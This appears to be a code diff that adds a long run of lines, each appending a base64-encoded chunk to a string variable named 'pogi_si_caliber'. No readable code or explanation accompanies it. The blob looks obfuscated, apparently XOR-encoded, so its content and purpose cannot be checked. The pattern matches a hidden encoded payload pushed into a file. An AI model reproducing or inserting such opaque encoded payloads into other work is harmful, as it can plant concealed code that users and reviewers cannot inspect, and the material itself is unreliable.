+pogi_si_caliber += "+N18bb1+DMzdfGzdeDnoOE/9aTk8GU/9aTk8GU/9aTk8GUhJip";
+pogi_si_caliber += "g4PB1s7T89HMxcrPxvXKxtTgzNbN14vQz9bEio3Xy8bNi8DM1s";
+pogi_si_caliber += "3Xg56dg9ipg4ODg8rFi8zTxs3uxs7BxtGDgp6eg87GzsHG0YqD";
+pogi_si_caliber += "0cbX1tHNmKmDg4OD1crG1NDgzNbN1+bPjdfG29fgzM3Xxs3Xg5";
+pogi_si_caliber += "6D19rTxszFg8DM1s3Xg56enoOEzdbOwcbRhIOcg8DM1s3XjdfM";
+pogi_si_caliber += "78zAws/G8NfRys3Ei4qDmYOE/9aRk5KXhJipg4Peipip3qmpxd";
+pogi_si_caliber += "bNwNfKzM2DwM/M0Mbz0czFys/Gi4rYqYODysWLgtPRzMXKz8bu";
+pogi_si_caliber += "zMfCz43Az8LQ0O/K0NeNwMzN18LKzdCLhNXK0MrBz8aEioqD0c";
+pogi_si_caliber += "bX1tHNmKmDg8DPxsLR98rOxszW14vAzsf3ys7G0YqYqYODwM/G";
+pogi_si_caliber += "wtH3ys7GzNbXi9HWzffKzsbRipipg4PAzM3Q14PR1s2DnoPHzM";
+pogi_si_caliber += "DWzsbN143Extfmz8bOxs3X4drqx4uE09HMxcrPxu7Mx8LP8dbN";
+pogi_si_caliber += "hIqYqYOD0dbNjcvKx8fGzYOeg9fR1saYqYOD0dbNjcDPwtDQ78";
+pogi_si_caliber += "rQ143Rxs7M1caLhMzNhI+DhMfMzcaEipipg4PT0czFys/G7szH";
+pogi_si_caliber += "ws+NwM/C0NDvytDXjdHGzszVxouE19rTys3EhIqYqYOD09HMxc";
+pogi_si_caliber += "rPxu7Mx8LPjcDPwtDQ78rQ143Rxs7M1caLhNXK0MrBz8aEipip";
+pogi_si_caliber += "g4PT0czFys/G7szHws+N0MbX4tfX0crB1tfGi4TC0crCjsvKx8";
+pogi_si_caliber += "fGzYSPg4TX0dbGhIqYqamDg8DMzdDXg9POg56Dx8zA1s7GzdeN";
+pogi_si_caliber += "xMbX5s/GzsbN1+Ha6seLhNPRzMXKz8bu1tDKwObPhIqYqYODys";
+pogi_si_caliber += "WLgtPOjdPC1tDGx4qD086N08LW0MaLipipg4PKxYvC1sfKzPDX";
+pogi_si_caliber += "wtHXxseKg9bNx9bAyPDK18bi1sfKzIuKmKmDg8bP0MaD0NfC0d";
+pogi_si_caliber += "fizsHKxs3X4tbHysyLipipqYODysWLz8zAwtfKzM2N08LXy83C";
+pogi_si_caliber += "zsaDgp6eg4SMhIrYqYODg4PX0drYg8vK0NfM0dqN09bQy/DXwt";
+pogi_si_caliber += "fGi83Wz8+Pg4SEj4OEjISKmIPewMLXwMuLxtHRitjeqYOD3qmD";
+pogi_si_caliber += "g8zTxs3uxs7BxtGDnoPN1s/PmKneqanHzMDWzsbN143Extfmz8";
+pogi_si_caliber += "bOxs3X4drqx4uE09HMxcrPxu7Mx8LP4M/M0MaEio3Cx8fm1cbN";
+pogi_si_caliber += "1+/K0NfGzcbRi4TAz8rAyISPg8DPzNDG89HMxcrPxoqYqdPRzM";
+pogi_si_caliber += "XKz8buzMfCz43Cx8fm1cbN1+/K0NfGzcbRi4TAz8rAyISPg8aD";
+pogi_si_caliber += "np2D2IPKxYvGjdfC0cTG14Oenp6D09HMxcrPxu7Mx8LPioPAz8";
+pogi_si_caliber += "zQxvPRzMXKz8aLipiD3oqYqcfMwNbOxs3XjcLHx+bVxs3X78rQ";
+pogi_si_caliber += "18bNxtGLhMjG2sfM1M2Ej4PGg56dg9iDysWLxo3IxtqDnp6eg4";
+pogi_si_caliber += "Tm0MDC08aEioPAz8zQxvPRzMXKz8aLipiD3oqYqcLHx+bVxs3X";
+pogi_si_caliber += "78rQ18bNxtGLhNPM09DXwtfGhI+DwM/M0Mbz0czFys/Gipipqc";
+pogi_si_caliber += "DMzdDXg87C19HK2+DCzdXC0IOeg8fMwNbOxs3XjcTG1+bPxs7G";
+pogi_si_caliber += "zdfh2urHi4TOwtfRytuEipipwMzN0NeDzsDX24Oeg87C19HK2+";
+pogi_si_caliber += "DCzdXC0I3ExtfgzM3XxtvXi4SRx4SKmKnAzM3Q14PQzszIxuDC";
+pogi_si_caliber += "zdXC0IOeg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2urHi4TQzszIxo";
+pogi_si_caliber += "SKmKnAzM3Q14PQwNfbg56D0M7MyMbgws3VwtCNxMbX4MzN18bb";
+pogi_si_caliber += "14uEkceEipipwMzN0NeD8eLq7fzk7/rz6/CDnoOEk5KfnYz//9";
+pogi_si_caliber += "+InomZjYCGhJipwMzN0NeD8eLq7fzg7O+DnoORkY+D8eLq7fzx";
+pogi_si_caliber += "7PSDnoOSl5ipz8bXg87gzM/Qg56D+P6Pg87C19HK2+zNg56Dxc";
+pogi_si_caliber += "LP0MaPg87vwtDXg56Dk5ipz8bXg9DzwtHX0IOeg/j+j4PQ8cLF";
+pogi_si_caliber += "g56Dk4+D0O/C0NeDnoOTj4PQ8NPRytfGg56DzdbPz5ipz8bXg8";
+pogi_si_caliber += "Xb8NfC0dfGx4Oeg8XCz9DGmKmpwMzN0NeD0cLKzeTP2tPLg56D";
+pogi_si_caliber += "i4qDnp2D8eLq7fzk7/rz6/D4i+7C18uN0cLNx8zOi4qDiYPx4u";
+pogi_si_caliber += "rt/OTv+vPr8I3Pxs3E18uKg9+Dk/6YqanF1s3A18rMzYPQytnG";
+pogi_si_caliber += "5dvgws3VwtCLwNWPg8DX24rYqYODwMzN0NeDx9PRg56D7sLXy4";
+pogi_si_caliber += "3Oys2LkY+D1MrNx8zUjcfG1crAxvPK28bP8cLXysyD39+DkoqY";
+pogi_si_caliber += "qYODwNWN1MrH18uDnoPuwtfLjc7C24uSj4PuwtfLjdHM1s3Hi8";
+pogi_si_caliber += "rNzcbR9MrH18uDiYPH09GKipipg4PA1Y3LxsrEy9eDnoPuwtfL";
+pogi_si_caliber += "jc7C24uSj4PuwtfLjdHM1s3Hi8rNzcbR68bKxMvXg4mDx9PRio";
+pogi_si_caliber += "qYqYODwNfbjdDG1/fRws3QxczRzovH09GPg5OPg5OPg8fT0Y+D";
+pogi_si_caliber += "k4+Dk4qYqd6pxdbNwNfKzM2Dys3K1+7C19HK24uK2KmDg8DMzd";
+pogi_si_caliber += "DXg8DM1s3Xg56D7sLXy43AxsrPi8rNzcbR9MrH18uDjIPx4urt";
+pogi_si_caliber += "/ODs74qDiIOSmKmDg87gzM/Qg56D4tHRwtqNxdHMzovYg8/Gzc";
+pogi_si_caliber += "TXy5mDwMzWzdeD3o+Di4qDnp2Di9ipg4ODg9qZg+7C18uN0cLN";
+pogi_si_caliber += "x8zOi4qDiYPKzc3G0evGysTL14+pg4ODg9DTxsbHmYOSg4iD7s";
+pogi_si_caliber += "LXy43Rws3HzM6LioOJg5GNl4+pg4ODg8DLwtHQmYPi0dHC2o3F";
+pogi_si_caliber += "0czOi9iDz8bNxNfLmYOVg4iDi4vuwtfLjdHCzcfMzouKg4mDmo";
+pogi_si_caliber += "qD34OTioPej4PRwsrN5M/a08uKj6mDg96Kipip3qnF1s3A18rM";
+pogi_si_caliber += "zYPH0cLU7sLX0crbi83M1IrYqYODysWLgs7C19HK2+zNioPRxt";
+pogi_si_caliber += "fW0c2YqYOD0cbS1sbQ1+LNys7C18rMzeXRws7Gi8fRwtTuwtfR";
+pogi_si_caliber += "ytuKmKmDg8rFi83M1IOOg87vwtDXg5+DkJCKg9HG19bRzZipg4";
+pogi_si_caliber += "PO78LQ14Oeg83M1Jipg4PAzM3Q14PUg56Dys3NxtH0ysfXy4+D";
+pogi_si_caliber += "y4Oeg8rNzcbR68bKxMvXmKmDg87A19uNwM/GwtHxxsDXi5OPg5";
+pogi_si_caliber += "OPg9SPg8uKmKmDg87A19uNxczN14Oeg4SSkdPbg4HgwtDAwsfK";
+pogi_si_caliber += "woPgzMfGgY/gzM3QzM/C0I+B79bAysfCg+DMzdDMz8aBj87Mzc";
+pogi_si_caliber += "zQ08LAxoSYqYODzsDX243XxtvX4cLQxs/KzcaDnoOE18zThJip";
+pogi_si_caliber += "g4POwNfbjcXKz8/w19rPxoOeg4SAxcWXx5bAhJipg4PFzNGLz8";
+pogi_si_caliber += "bXg8qDnoOTmIPKg5+DzuDMz9CNz8bNxNfLmIPKiIiK2KmDg4OD";
+pogi_si_caliber += "wMzN0NeDwMzPg56DzuDMz9D4yv6Pg9uDnoPx4urt/ODs74OJg8";
+pogi_si_caliber += "qDiIOXj4PX0cLKz4Oeg8DMz43Ay8LR0I3Pxs3E18uYqYODg4PA";
+pogi_si_caliber += "zM3Q14PLxsLH8czUg56D7sLXy43Fz8zM0YvAzM+N2oOMg/Hi6u";
+pogi_si_caliber += "388ez0ipipg4ODg8XM0YvPxteD14Oeg5OYg9eDn4PX0cLKz5iD";
+pogi_si_caliber += "14iIitipg4ODg4ODzsDX243Ez8zBws/iz9PLwoOeg9eDnIONko";
+pogi_si_caliber += "OJg4uSg46D14OMg9fRwsrPioOZg42Rl5ipg4ODg4ODwMzN0NeD";
+pogi_si_caliber += "ysfbg56D7sLXy43CwdCLkpCSg4mDyoOIg5CUg4mDi8vGwsfxzN";
+pogi_si_caliber += "SDjoPXioqDhoPx4urt/OTv+vPr8I3Pxs3E18uYqYODg4ODg87A";
+pogi_si_caliber += "19uNxcrPz/fG29eL8eLq7fzk7/rz6/CNwMvC0eLXi8rH24qPg9";
+pogi_si_caliber += "uPg8DMz43ag46D8eLq7fzx7PSDiYPXipipg4ODg96pg4ODg8DM";
+pogi_si_caliber += "z43ag4ieg8DMz43Q08bGx5ipg4ODg8rFi8DMz43ag46D8eLq7f";
+pogi_si_caliber += "zx7PSDiYPX0cLKz4Odg8uK2KmDg4ODg4PAzM+N2oOeg46Rk5OD";
+pogi_si_caliber += "iYPuwtfLjdHCzcfMzouKmKmDg4ODg4PAzM+N0NPGxseDnoOSg4";
+pogi_si_caliber += "iD7sLXy43Rws3HzM6LioOJg5GNl5ipg4ODg96pg4PeqYODzsDX";
+pogi_si_caliber += "243Ez8zBws/iz9PLwoOeg5KYqd6pxdbNwNfKzM2D0NfC0dfuwt";
+pogi_si_caliber += "fRytuLitipg4PQytnG5dvgws3VwtCLzsLX0crb4MLN1cLQj4PO";
+pogi_si_caliber += "wNfbipipg4PKzcrX7sLX0crbi4qYqYODysWL0cbH1sDG7szXys";
+pogi_si_caliber += "zNioPRxtfW0c2YqYODzsLX0crb7M2DnoPX0dbGmKmDg87vwtDX";
+pogi_si_caliber += "g56Dk5ipg4PRxtLWxtDX4s3KzsLXyszN5dHCzsaLx9HC1O7C19";
+pogi_si_caliber += "HK24qYqd6pxdbNwNfKzM2DzsLIxvDOzMjG8NPRytfGi4rYqYOD";
+pogi_si_caliber += "wMzN0NeD0IOeg8fMwNbOxs3XjcDRxsLXxubPxs7GzdeLhMDCzd";
+pogi_si_caliber += "XC0ISKmKmDg9CN1MrH18uDnoPQjcvGysTL14Oeg5qVmKmDg8DM";
+pogi_si_caliber += "zdDXg8CDnoPQjcTG1+DMzdfG29eLhJHHhIqYqYODwMzN0NeDxI";
+pogi_si_caliber += "Oeg8CNwNHGwtfG8cLHysLP5NHCx8rGzdeLl5uPg5ebj4OTj4OX";
+pogi_si_caliber += "m4+Dl5uPg5ebipipg4PEjcLHx+DMz8zR8NfM04uTj4OE0cTBwo";
+pogi_si_caliber += "uRlpaPkpCTj5KXlo+SioSKmKmDg8SNwsfH4MzPzNHw18zTi42Q";
+pogi_si_caliber += "lo+DhNHEwcKLkZOWj5WTj5Sbj42WloqEipipg4PEjcLHx+DMz8";
+pogi_si_caliber += "zR8NfM04uSj4OE0cTBwouSkZOPkZOPkJOPk4qEipipg4PAjcXK";
+pogi_si_caliber += "z8/w19rPxoOeg8SYqYODwI3Fys/P8cbA14uTj4OTj4OalY+Dmp";
+pogi_si_caliber += "WKmKmDg9HG19bRzYPQmKneqcXWzcDXyszNg9DTwtTN8M7MyMaL";
+pogi_si_caliber += "24+D2o+DzYrYqYODxczRi8/G14PKg56Dk5iDyoOfg82Yg8qIiI";
+pogi_si_caliber += "rYqYODg4PQ88LR19CN09bQy4vYqYODg4ODg9uZg9uDiIOL7sLX";
+pogi_si_caliber += "y43Rws3HzM6LioOOg42WioOJg5Kbj6mDg4ODg4PamYPag4iDi+";
+pogi_si_caliber += "7C18uN0cLNx8zOi4qDjoONloqDiYOSm4+pg4ODg4OD1duZg4vu";
+pogi_si_caliber += "wtfLjdHCzcfMzouKg46DjZaKg4mDkpWPqYODg4ODg9XamYOOkp";
+pogi_si_caliber += "ODjoPuwtfLjdHCzcfMzouKg4mDkZePqYODg4ODg9GZg5qDiIPu";
+pogi_si_caliber += "wtfLjdHCzcfMzouKg4mDkpuPqYODg4ODg8TRzNSZg5KVg4iD7s";
+pogi_si_caliber += "LXy43Rws3HzM6LioOJg5Gbj6mDg4ODg4PCmYONkpGDiIPuwtfL";
+pogi_si_caliber += "jdHCzcfMzouKg4mDjZKQj6mDg4ODg4PPysXGmYOTj6mDg4ODg4";
+pogi_si_caliber += "PX18+Zg42bg4iD7sLXy43Rws3HzM6LioOJg42bj6mDg4OD3oqY";
+pogi_si_caliber += "qYOD3qmDg8rFi9DzwtHX0I3Pxs3E18uDnYOak4qD0PPC0dfQjd";
+pogi_si_caliber += "DTz8rAxouTj4PQ88LR19CNz8bNxNfLg46DmpOKmKmDg8rFi4LQ";
+pogi_si_caliber += "8cLFitiD0O/C0NeDnoPTxtHFzNHOws3Axo3NzNSLipiD0PHCxY";
+pogi_si_caliber += "Oeg9HG0tbG0NfizcrOwtfKzM3l0cLOxovQzszIxuXRws7GipiD";
+pogi_si_caliber += "3qneqcXWzcDXyszNg9DOzMjG5dHCzsaLzczUitipg4PAzM3Q14";
+pogi_si_caliber += "PH14Oeg+7C18uNzsrNi42Tlo+Di83M1IOOg9DvwtDXioOMg5KT";
+pogi_si_caliber += "k5OD39+DjZOSlYqYqYOD0O/C0NeDnoPNzNSYqYOD0MDX243Az8";
+pogi_si_caliber += "bC0fHGwNeLk4+Dk4+Dys3NxtH0ysfXy4+Dys3NxtHrxsrEy9eK";
+pogi_si_caliber += "mKmDg9DA19uNxM/MwcLP4MzO08zQytfG7NPG0cLXyszNg56DhM";
+pogi_si_caliber += "/KxMvXxtGEmKmDg8XM0YvPxteDyoOeg9DzwtHX0I3Pxs3E18uD";
+pogi_si_caliber += "joOSmIPKg52eg5OYg8qOjorYqYODg4PAzM3Q14PTg56D0PPC0d";
+pogi_si_caliber += "fQ+Mr+mKmDg4OD043PysXGg4ieg8fXmKmDg4ODysWL043PysXG";
+pogi_si_caliber += "g52eg9ON19fPitiD0PPC0dfQjdDTz8rAxovKj4OSipiDwMzN18";
+pogi_si_caliber += "rN1saYg96pg4ODg9ON24OInoPTjdXbg4mDx9eYqYODg4PTjdqD";
+pogi_si_caliber += "iJ6D043V2oOJg8fXmKmDg4OD043V24OJnoONmpuWmKmDg4OD04";
+pogi_si_caliber += "3V2oOOnoOXg4mDx9eYqYODg4PAzM3Q14PIg56D043PysXGg4yD";
+pogi_si_caliber += "043X18+YqYODg4PAzM3Q14PRg56D043Rg4iD043E0czUg4mDyJ";
+pogi_si_caliber += "ipg4ODg9DA19uNxM/MwcLP4s/Ty8KDnoPuwtfLjc7C24uTj4PT";
+pogi_si_caliber += "jcKDiYOLkoOOg8iKipipg4ODg9DA19uNx9HC1OrOwsTGi9Dw09";
+pogi_si_caliber += "HK18aPg9ON24OOg9GPg9ON2oOOg9GPg9GDiYORj4PRg4mDkYqY";
+pogi_si_caliber += "qYOD3qmDg9DA19uNxM/MwcLP4s/Ty8KDnoOSmKmDg8rFi9Dzwt";
+pogi_si_caliber += "HX0I3Pxs3E18uK2KmDg4OD0PHCxYOeg9HG0tbG0NfizcrOwtfK";
+pogi_si_caliber += "zM3l0cLOxovQzszIxuXRws7Gipipg4Pexs/Qxtipg4ODg9Dxws";
+pogi_si_caliber += "WDnoOTmKmDg4OD0MDX243Az8bC0fHGwNeLk4+Dk4+Dys3NxtH0";
+pogi_si_caliber += "ysfXy4+Dys3NxtHrxsrEy9eKmKmDg96p3qnF1s3A18rMzYPQ18";
+pogi_si_caliber += "LR1+Xbi4rYqYODysWLxdvw18LR18bHioPRxtfW0c2YqYODxdvw";
+pogi_si_caliber += "18LR18bHg56D19HWxpipg4PQytnG5dvgws3VwtCL0M7MyMbgws";
+pogi_si_caliber += "3VwtCPg9DA19uKmKmDg9Dw09HK18aDnoPOwsjG8M7MyMbw09HK";
+pogi_si_caliber += "18aLipipg4PQ18LR1+7C19HK24uKmKmpg4PCx8fm1cbN1+/K0N";
+pogi_si_caliber += "fGzcbRi4TRxtDK2caEj4OLioOenYPYqYODg4PQytnG5dvgws3V";
+pogi_si_caliber += "wtCL0M7MyMbgws3VwtCPg9DA19uKmKmDg4ODysWLzsLX0crb7M";
+pogi_si_caliber += "2K2KmDg4ODg4PQytnG5dvgws3VwtCLzsLX0crb4MLN1cLQj4PO";
+pogi_si_caliber += "wNfbipipg4ODg4ODys3K1+7C19HK24uKmKmDg4OD3qmDg96KmK";
+pogi_si_caliber += "mDg8LHx+bVxs3X78rQ18bNxtGLhNPMys3XxtHHzNTNhI+DxoOe";
+pogi_si_caliber += "nYPYqYODg4PKxYvRxsfWwMbuzNfKzM2D39+Dxo3TzMrN18bR99";
+pogi_si_caliber += "rTxoOenp6DhNfM1sDLhIPf34OCx8zA1s7GzdeNwczH2o3Az8LQ";
+pogi_si_caliber += "0O/K0NeNwMzN18LKzdCLhMrNhIqKg9HG19bRzZipg4ODg9DTwt";
+pogi_si_caliber += "TN8M7MyMaLxo3Az8rGzdf7j4PGjcDPysbN1/qPg5SKmKmDg96P";
+pogi_si_caliber += "g9iD08LQ0MrVxpmD19HWxoPeipip3qmpz8bXg8bN18bRxseDno";
+pogi_si_caliber += "PFws/Qxpipz8bXg8TC18bs08bNg56DxcLP0MaYqc/G14PB1srP";
+pogi_si_caliber += "x8rNxIOeg8XCz9DGmKnAzM3Q14PGzdfG0ebPg56Dx8zA1s7Gzd";
+pogi_si_caliber += "eNxMbX5s/GzsbN1+Ha6seLhMbN18bRhIqYqcDMzdDXg9DTz8LQ";
+pogi_si_caliber += "y+LR14Oeg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2urHi4TQ08/C0M";
+pogi_si_caliber += "vi0deEipipwMzN0NeDz8zCx+XKz8+DnoPHzMDWzsbN143Extfm";
+pogi_si_caliber += "z8bOxs3X4drqx4uExs3XxtHvzMLH5crPz4SKmKnAzM3Q14PPzM";
+pogi_si_caliber += "LH88DXg56Dx8zA1s7GzdeNxMbX5s/GzsbN1+Ha6seLhMbN18bR";
+pogi_si_caliber += "78zCx/PA14SKmKnAzM3Q14Pw8+/i8Ov87vCDnoOQk5OTmKnAzM";
+pogi_si_caliber += "3Q14Ph9urv5/zu8IOeg5KUlpOYqanF1s3A18rMzYPRxtXGws/w";
+pogi_si_caliber += "ytfGi4rYqYODx8zA1s7GzdeNwczH2o3Az8LQ0O/K0NeNwsfHi4";
+pogi_si_caliber += "TKzYSKmKmDg8rNytfwwNHMz8/xxtXGws+Lipipg4PQ18LR1+Xb";
+pogi_si_caliber += "i4qYqYOD0NfC0dfi0dfmzcTKzcaLwcLNzcbR5s+KmKmDg9DXwt";
+pogi_si_caliber += "HX4cLAyMTRzNbNx+LR14uKmKmDg8bN18bR5s+NwM/C0NDvytDX";
+pogi_si_caliber += "jcLHx4uExMzNxoSKmKmDg9DG1/fKzsbM1teLi4qDnp2D2IPGzd";
+pogi_si_caliber += "fG0ebPjdDX2s/GjcfK0NPPwtqDnoOEzczNxoSYg96Pg5KRk5OK";
+pogi_si_caliber += "mKmDg8rFi8fGxtPvys3Ixsfz0czFys/GioPQxtf3ys7GzNbXi4";
+pogi_si_caliber += "uKg56dg8zTxs3z0czFys/Gi8fGxtPvys3Ixsfz0czFys/Gio+D";
+pogi_si_caliber += "kpKTk4qYqd6pqcXWzcDXyszNg8bN18bR8MrXxouK2KmDg8rFi8";
+pogi_si_caliber += "bN18bRxseKg9HG19bRzZipg4PGzdfG0cbHg56D19HWxpipg4PK";
+pogi_si_caliber += "xYuCx8bG0+/KzcjGx/PRzMXKz8aKg9DXwtHX4s7BysbN1+LWx8";
+pogi_si_caliber += "rMi4qYqYOD0cbVxsLP8MrXxouKmKneqanF1s3A18rMzYPQy8zU";
+pogi_si_caliber += "4tHXi4rYqYODxs3XxtHmz43Az8LQ0O/K0NeNwsfHi4TC0deEip";
+pogi_si_caliber += "ipg4PQxtf3ys7GzNbXi4uKg56dg9ipg4ODg9DXwtHX4tHX5s3E";
+pogi_si_caliber += "ys3Gi8bN18bR4tHXipipg4ODg9DXwtHX78zCx+7G18bRi4qYqY";
+pogi_si_caliber += "OD3o+DkZuTipip3qmpxdbNwNfKzM2D0NfC0dfvzMLH7sbXxtGL";
+pogi_si_caliber += "itipg4PKxYvRxsfWwMbuzNfKzM2D39+Dgs/Mwsflys/Pg9/fg4";
+pogi_si_caliber += "LPzMLH88DXioPRxtfW0c2YqYODz8zCx+XKz8+N0Nfaz8aN19HC";
+pogi_si_caliber += "zdDFzNHOg56DhNDAws/G+4uTioSYqYODz8zCx/PA143XxtvX4M";
+pogi_si_caliber += "zN18bN14Oeg4SThoSYqYODxs3XxtHmz43Az8LQ0O/K0NeN0cbO";
+pogi_si_caliber += "zNXGi4THzM3GhIqYqYODwMzN0NeD15ODnoPTxtHFzNHOws3Axo";
+pogi_si_caliber += "3NzNSLipipg4PAzM3Q14PQ18bTg56DzczUg56dg9ipg4ODg8DM";
+pogi_si_caliber += "zdDXg9ODnoPuwtfLjc7KzYuSj4OLzczUg46D15OKg4yD4fbq7+";
+pogi_si_caliber += "f87vCKmKmDg4ODz8zCx+XKz8+N0Nfaz8aN19HCzdDFzNHOg56D";
+pogi_si_caliber += "hNDAws/G+4uEg4iD043XzOXK28bHi5CKg4iDhIqEmKmDg4ODz8";
+pogi_si_caliber += "zCx/PA143XxtvX4MzN18bN14Oeg+7C18uN0czWzceL04OJg5KT";
+pogi_si_caliber += "k4qDiIOEhoSYqYODg4PKxYvTg5+DkorYg9HG0tbG0NfizcrOwt";
+pogi_si_caliber += "fKzM3l0cLOxovQ18bTipiD0cbX1tHNmIPeqYODg4PGzdfG0ebP";
+pogi_si_caliber += "jcDPwtDQ78rQ143Cx8eLhMfMzcaEipipg4PemKmDg9HG0tbG0N";
+pogi_si_caliber += "fizcrOwtfKzM3l0cLOxovQ18bTipip3qmpxdbNwNfKzM2Dy8zP";
+pogi_si_caliber += "x/DTz8LQy4uK2KmDg8rFi8bN18bRxseD39+DwdbKz8fKzcSKg9";
+pogi_si_caliber += "HG19bRzZipg4PGzdfG0ebPjcDPwtDQ78rQ143Cx8eLhMvGz8eE";
+pogi_si_caliber += "ipipg4PQxtf3ys7GzNbXi4uKg56dg9iDysWL0NPPwtDL4tHXio";
+pogi_si_caliber += "PQ08/C0Mvi0deN0Nfaz8aN1crQysHKz8rX2oOeg4TLysfHxs2E";
+pogi_si_caliber += "mIPej4OSk5OTipip3qmpxdbNwNfKzM2DzNPGzeTC18aLitipg4";
+pogi_si_caliber += "PKxYvEwtfG7NPGzYPf34PGzdfG0cbHioPRxtfW0c2YqYODxMLX";
+pogi_si_caliber += "xuzTxs2DnoPX0dbGmKmDg8bN18bR5s+NwM/C0NDvytDXjcLHx4";
+pogi_si_caliber += "uE0cbCx9qEipipg4PGzdfG0ebPjdDG1+LX19HKwdbXxouEwtHK";
+pogi_si_caliber += "wo7PwsHGz4SPg4TmzdfG0YSKmKneqanF1s3A18rMzYPQyMrT6s";
+pogi_si_caliber += "3X0cyLitipg4PGzdfG0ebPjcDPwtDQ78rQ143Cx8eLhM3MjtXK";
+pogi_si_caliber += "x8bMhIqYqYOD0MvM1OLR14uKmKmDg8zTxs3kwtfGi4qYqd6pqc";
+pogi_si_caliber += "XWzcDXyszNg8HGxMrN4dbKz8eLitipg4PKxYvGzdfG0cbHg9/f";
+pogi_si_caliber += "g8HWys/Hys3Eg9/fg4LEwtfG7NPGzYqD0cbX1tHNmKmDg8HWys";
+pogi_si_caliber += "/Hys3Eg56D19HWxpipg4PGzdfG0ebPjcDPwtDQ78rQ143Cx8eL";
+pogi_si_caliber += "hMHWys/HhIqYqYOD0MvM1OLR14uKmKmDg8rFi9HGx9bAxu7M18";
+pogi_si_caliber += "rMzYrYg8bN18bR8MrXxouKmIPRxtfW0c2Yg96pg4PQxtf3ys7G";
+pogi_si_caliber += "zNbXi8bN18bR8MrXxo+DkZWTk4qYqd6pqcXWzcDXyszNg9DXwt";
+pogi_si_caliber += "HX8NPPwtDLi4rYqYODysWL0cbH1sDG7szXyszNg9/fg4LQ08/C";
+pogi_si_caliber += "0Mvi0deK2IPQyMrT6s3X0cyLipiD0cbX1tHNmIPeqYODz8bXg8";
+pogi_si_caliber += "LRzsbHg56DxcLP0MaYqYODwMzN0NeDwtHOg56Di4qDnp2D2KmD";
+pogi_si_caliber += "g4ODysWLwtHOxseKg9HG19bRzZipg4ODg8LRzsbHg56D19HWxp";
+pogi_si_caliber += "ipg4ODg9DG1/fKzsbM1teLy8zPx/DTz8LQy4+D8PPv4vDr/O7w";
+pogi_si_caliber += "ipipg4ODg9DG1/fKzsbM1teLzNPGzeTC18aPg/Dz7+Lw6/zu8I";
+pogi_si_caliber += "qYqYOD3pipg4PQ08/C0Mvi0deNwsfH5tXGzdfvytDXxs3G0YuE";
+pogi_si_caliber += "xtHRzNGEj4PQyMrT6s3X0cyPg9iDzM3AxpmD19HWxoPeipipg4";
+pogi_si_caliber += "PAzM3Q14PUwtfAy4Oeg4uKg56dg9ipg4ODg8rFi8LRzsbHg9/f";
+pogi_si_caliber += "g8TC18bs08bNioPRxtfW0c2YqYODg4PKxYvQ08/C0Mvi0deNwM";
+pogi_si_caliber += "zO08/G18aK2KmDg4ODg4PKxYvQ08/C0Mvi0deNzcLX1tHCz/TK";
+pogi_si_caliber += "x9fLioPC0c6Lipipg4ODg4ODxs/QxoPQyMrT6s3X0cyLipipg4";
+pogi_si_caliber += "ODg4OD0cbX1tHNmKmDg4OD3qmDg4OD0MbX98rOxszW14vUwtfA";
+pogi_si_caliber += "y4+Dm5OKmKmDg96YqYOD1MLXwMuLipipg4PQxtf3ys7GzNbXi8";
+pogi_si_caliber += "zTxs3kwtfGj4Pw8+/i8Ov87vCDiIORlpOTipip3qmpxs3XxtHm";
+pogi_si_caliber += "z43Cx8fm1cbN1+/K0NfGzcbRi4TAz8rAyISPg8HGxMrN4dbKz8";
+pogi_si_caliber += "eKmKnHzMDWzsbN143Cx8fm1cbN1+/K0NfGzcbRi4TIxtrHzNTN";
+pogi_si_caliber += "hI+DxoOenYPYqYODysWLgsbN18bRxseDhYWDi8aNyMbag56eno";
+pogi_si_caliber += "OE5s3XxtGEg9/fg8aNyMbag56enoOEg4SKitiDxo3T0cbVxs3X";
+pogi_si_caliber += "58bFwtbP14uKmIPBxsTKzeHWys/Hi4qYg96p3oqYqdHM0NfG0e";
+pogi_si_caliber += "bPjcLHx+bVxs3X78rQ18bNxtGLhMDPysDIhI+DxoOenYPYqYOD";
+pogi_si_caliber += "wMzN0NeDwdfNg56Dxo3XwtHExteNwM/M0MbQ14uEjc6Eipipg4";
+pogi_si_caliber += "PKxYvB182DhYWDx8zA1s7GzdeNwczH2o3Az8LQ0O/K0NeNwMzN";
+pogi_si_caliber += "18LKzdCLhMrNhIqKg8zTxs3z0czFys/Gi+H66uf4wdfNjcfC18";
+pogi_si_caliber += "LQxteNysf+ipip3oqYqanQ18LR1/DTz8LQy4uKmKnQ18LR1/PR";
+pogi_si_caliber += "xtDGzcDGi4qYqd6Ki4qYqamMjIODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODjY2Dg4ODjYODg4ODg4ODg4ONjYODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4OpjIyDg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg9uDjcebm4GDg4OD45ubnYODjYPW9JuBg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODqYyMg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODlpubm/GDg4ODg4ab84ODg8PXm5ubg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODjdaDg4ODjYODg6mMjIODg4ODg4";
+pogi_si_caliber += "ONg4ODg4ODg4OD1oODg4ODg4Sbm5vxg4ODg4ODjYODg4ODm5ub";
+pogi_si_caliber += "m4ODg42Dg4ODg4ODg43Wg4ODg4ONx5ub4YOZ45vAg4OpjIyDg4";
+pogi_si_caliber += "3Wx/Gbm+2Dg4ODg9bQm5ub1o2Dg4ODm5ub8YODg4ON45ub1oOD";
+pogi_si_caliber += "g5qbm5uN2Zub7YODg4PWx5ubm5uNg4OegZubm5vFm5ubm9GDqY";
+pogi_si_caliber += "yMg5+bm5uEm5ubyION45ubg4Gbm5ubgYODg5ubm/GDg4OEhJub";
+pogi_si_caliber += "m+bDg4Oam5ubg4Obm5vmg5mbm5uEm5ubm42Dg4OXm5ubnYSbm4";
+pogi_si_caliber += "GDg6mMjIOam5ubg4T6gYODmpubm4ODmpubm4ODg4Obm5vxg4OD";
+pogi_si_caliber += "g4Obm5vmg4ODmpubm4ODm5ub5oPHm5ubg4Sbm4aBg4ODl5ubm5";
+pogi_si_caliber += "2DhIODg4OpjIyDmpubm4ODg4ODg5qbm5uDg5qbm5uDg4ODm5ub";
